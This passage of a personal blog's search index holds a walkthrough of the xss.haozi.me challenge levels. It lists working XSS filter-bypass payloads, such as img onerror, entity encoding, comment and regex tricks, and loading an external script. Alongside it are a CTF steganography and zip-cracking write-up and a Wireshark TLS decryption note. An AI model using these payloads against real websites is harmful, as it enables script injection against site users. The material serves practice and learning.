<h3 id="recatch-the-traffic-and-analyze">recatch the traffic and analyze</h3>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/6.png" class="" title="remove dhe">
<p>After importing the private key, we can see the  decrypted<code>http traffic</code>.</p>
<img src="/2022/12/20/22-12-20-Encrypto-Wireshark/7.png" class="" title="decrypted http traffic">
<h1>CONCLUSION</h1>
<p>The <code>Diffie-Hellman-Exchange</code> is really beyond my imagination.</p>
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
        <tag>diffie_hellman</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-20-qw5-mimic-defence</title>
    <url>/2022/12/20/22-12-20-qw5-mimic-defence/</url>
    <content><![CDATA[<span id="more"></span><!--toc-->
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
      <tags>
        <tag>crt</tag>
        <tag>fermat_little_theorem</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-30-XSS</title>
    <url>/2022/12/30/22-12-30-XSS/</url>
    <content><![CDATA[<blockquote>
<p><a href="https://xss.haozi.me/#/0x00">alert(1) (haozi.me)</a></p>
</blockquote>
<p>Make a record.</p>
<span id="more"></span><!--toc-->
<h1>0x00</h1>
<p><strong>No filtration.</strong> Just insert code normally.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x00.png" class="" title="0x00">
<h1>0x01</h1>
<ul>
<li><strong>End the label.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x01-1.png" class="" title="0x01-1">
<ul>
<li>End the label. <strong>IMG label error.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;img src=&quot;&quot; onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x01-2.png" class="" title="0x01-2">
<h1>0x02</h1>
<p><strong>End the html code.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x02.png" class="" title="0x02">
<h1>0x03</h1>
<p>Filtrate the <code>[()]</code>.  <strong>` to bypass.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x03.png" class="" title="0x03">
<h1>0x04</h1>
<p><strong>html code bypass.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=alert&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>
<p>Use burpsuite to encode the html.</p>
<img src="/2022/12/30/22-12-30-XSS/0x04-0.png" class="" title="0x04-0">
<img src="/2022/12/30/22-12-30-XSS/0x04-1.png" class="" title="0x04-1">
<h1>0x05</h1>
<p><strong>Comment bypass.</strong></p>
<p>There are two ways to comment for html.</p>
<ul>
<li><code>&lt;!-- comment --&gt;</code></li>
<li><code>&lt;!-- comment --!&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comment1 --!&gt; &lt;script&gt;alert(1)&lt;/script&gt; &lt;!-- comment2</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x05.png" class="" title="0x05">
<h1>0x06</h1>
<p>Regex matching, <strong>line break bypass</strong>.</p>
<img src="/2022/12/30/22-12-30-XSS/0x06-0.png" class="" title="0x06-0">
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type = &quot;image&quot; src=&quot;&quot; onerror</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x06-1.png" class="" title="0x06-1">
<h1>0x07</h1>
<p><strong>HTML single-tag parsing.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=alert(1) </span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x07-0.png" class="" title="0x07-0">
<img src="/2022/12/30/22-12-30-XSS/0x07.png" class="" title="0x07">
<h1>0x08</h1>
<ul>
<li><strong>Regex escape</strong>, the label to be closed add a space to escape.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x08-1.png" class="" title="0x08-1">
<ul>
<li><strong>Regex can’t match the space.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x08-0.png" class="" title="0x08-0">
<img src="/2022/12/30/22-12-30-XSS/0x08-2.png" class="" title="0x08-2">
<h1>0x09</h1>
<p>Include the website.</p>
<ul>
<li><strong>“” ending bypass with IMG label.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com &quot;&gt;&lt;/script&gt;&lt;img src=&quot;&quot; onerror=&quot;alert(1)</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x09-1.png" class="" title="0x09-1">
<ul>
<li><strong>add a character and “” ending bypass.</strong></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com1&quot; onerror=alert(1) </span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x09-2.png" class="" title="0x09-2">
<h1>0x0a</h1>
<blockquote>
<p>Failed! Don’t know why.</p>
</blockquote>
<ul>
<li><strong>Import the target file to complete the XSS.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com.haozi.me/j.js</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x0a.png" class="" title="0x0a">
<ul>
<li>the end of url add @target url</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com@https://www.xxx.com/j.js</span><br></pre></td></tr></table></figure>
<p><em>Make sure that the target url is <code>https</code>.</em></p>
<h1>0x0b</h1>
<p>IMG label and html encode.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x0b.png" class="" title="0x0b">
<h1>0x0c</h1>
<ul>
<li>
<p>Same above.</p>
</li>
<li>
<p>The anterior and posterior deformities are constructed.</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sscriptcript src=https://www.segmentfault.com.haozi.me/j.js&gt;&lt;/sscriptcript&gt;</span><br></pre></td></tr></table></figure>
<h1>0x0d</h1>
<p><strong><code>Enter</code> break the comment structure.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">alert(1) </span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x0d.png" class="" title="0x0d">
<h1>0x0e</h1>
<p>Think reverse, find the character <strong>ſ</strong> which means <code>s</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ſcript src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h1>0x0f</h1>
<p>HTML encode. End the code and comment at last.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;); alert(1) //</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x0f.png" class="" title="0x0f">
<h1>0x10</h1>
<p>No filtration. Just bypass.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;;alert(1);</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x10.png" class="" title="0x10">
<h1>0x11</h1>
<p><strong><code>//</code>is escaped, but it still runs at <code>//</code> in fact.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;);alert(1);//</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x11.png" class="" title="0x11">
<h1>0x12</h1>
<ul>
<li><strong>Escape the escape character.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&quot;); alert(1); //</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x12-1.png" class="" title="0x12-1">
<ul>
<li><strong>Embed label inline.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt; &lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x12-2.png" class="" title="0x12-2">
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
      <tags>
        <tag>penetration</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-21-UNknown</title>
    <url>/2022/12/21/22-12-21-UNknown/</url>
    <content><![CDATA[<p>Figure out 2 tasks.</p>
<p>One is for crypto, and the other is for misc.</p>
<p>Both of them are easy.</p>
<span id="more"></span><!--toc-->
<h1>poem</h1>
<blockquote>
<p>reference: [ACTF新生赛2020]base64隐写</p>
</blockquote>
<ul>
<li>base64stego</li>
<li>caeser cipher</li>
</ul>
<h2 id="base64stego">base64stego</h2>
<p><a href="22-12-21-UNknown/poem.txt">poem.txt</a></p>
<p><em>Make sure that the end of each line. This ending is <code>\r\n</code></em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">base64stego</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;poem.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># print(f.readlines())</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="built_in">str</span>(line, <span class="string">&#x27;utf-8&#x27;</span>).strip(<span class="string">&#x27;\r\n&#x27;</span>) <span class="comment"># edit</span></span><br><span class="line">        <span class="comment"># print(stegb64)</span></span><br><span class="line">        row64 = <span class="built_in">str</span>(base64.b64encode(base64.b64decode(stegb64)), <span class="string">&#x27;utf-8&#x27;</span>).strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]) - b64chars.index(row64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">    output = [<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)]</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(output)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h2 id="caeser-cipher">caeser cipher</h2>
<p><em>Just crack!</em></p>
<p>key is <code>13</code>.</p>
<h1>Alex2Bob</h1>
<p><a href="22-12-21-UNknown/Alex2Bob.zip">Alex2Bob</a></p>
<ul>
<li>ARCHPR-mask</li>
<li>PNG-header</li>
<li>PNG-crack width</li>
<li>LSB</li>
</ul>
<h2 id="ARCHPR-mask">ARCHPR-mask</h2>
<p>Known the end of the key is <code>kitty</code>.</p>
<p>This is the <code>mask attack</code>. We don’t know the length of the key, so we try some possibilities.</p>
<p>Until we try to set unknown length is 4, we get the key.</p>
<img src="/2022/12/21/22-12-21-UNknown/1.png" class="" title="setting&amp;output">
<h2 id="PNG-header">PNG-header</h2>
<p>Use the <code>winhex</code> and analyze the png. We find that the file header is wrong, so we should edit the file header <code>88 -&gt; 89</code>.</p>
<img src="/2022/12/21/22-12-21-UNknown/2.png" class="" title="PNG-header">
<p>Still can’t open the picture or see the content.</p>
<h2 id="PNG-crack-width">PNG-crack width</h2>
<p>Crack the true width, and we will get the width is <code>0x260</code>.</p>
<img src="/2022/12/21/22-12-21-UNknown/3.png" class="" title="real width">
<p>Edit the width by winhex or 010Editor, and we will get the real picture.</p>
<img src="/2022/12/21/22-12-21-UNknown/newcat.png" class="" title="newcat">
<h2 id="LSB">LSB</h2>
<p>Two ways to get the information embedded in LSB.</p>
<ul>
<li>stegsolve-original</li>
<li>zsteg</li>
</ul>
<img src="/2022/12/21/22-12-21-UNknown/4.png" class="" title="stegsolve-original">
<img src="/2022/12/21/22-12-21-UNknown/5.png" class="" title="zsteg">
<p>The cipher is <code>ZmxhZ3tsb3ZlX3JhZ2RvbGxfY2F0fQ==</code>, and base64 decode.</p>
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>MAKSIM-NABF-RYUICHI&amp;SAKAMOTO</title>
    <url>/2022/12/19/MAKSIM-NABF-RYUICHI-SAKAMOTO/</url>
    <content><![CDATA[<span id="more"></span><!--toc-->
]]></content>
      <categories>
        <category>Amusing</category>
      </categories>
      <tags>
        <tag>recital</tag>
        <tag>fair</tag>
      </tags>
  </entry>
  <entry>
    <title>ART&#39;N DIOR</title>
    <url>/2022/12/10/ART-N-DIOR/</url>
    <content><![CDATA[<p>By visiting the exhibition which named “ART’N DIOR”, I arise the interest in Artists’ Inner World. There are many exhibits in the exhibition which is created by artists all over the world.</p>
<p>These exhibits with unique design concepts are very interesting and novel. Therefore, they are the introductory subject of this article.</p>
<p>How amazing and fantastical the <strong>ART</strong> is.</p>
<span id="more"></span><!--toc-->
<h1>CONSTRUCT</h1>
<h1>CHAIR</h1>
<h1>LADY DIOR</h1>
]]></content>
      <categories>
        <category>Amusing</category>
      </categories>
      <tags>
        <tag>DIOR</tag>
        <tag>SHOW</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/10/21/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>
<h2 id="Quick-Start">Quick Start</h2>
<h3 id="Create-a-new-post">Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server">Run server</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files">Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
</search>
